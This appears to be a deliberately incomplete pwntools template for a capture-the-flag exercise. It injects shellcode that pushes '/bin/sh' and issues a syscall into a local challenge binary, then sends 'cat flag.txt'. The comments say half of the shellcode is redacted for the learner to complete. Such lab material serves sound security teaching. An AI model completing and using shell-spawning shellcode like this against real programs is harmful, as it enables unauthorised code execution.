from pwn import * 

elf=context.binary=ELF("./chal")
p=process(elf.path)
# gdb.attach(p)
# redacted half of the code. i've pushed a hex-encoded '/bin/sh' onto the stack for you
pay=asm("""
mov rax, 0x0068732f6e69622f;
push rax;

syscall;
""")
p.send(pay)
p.sendline(b"cat flag.txt && exit")
print(p.recvall(timeout=1)) # should see "b'placeholder\n'" appear in your console :)
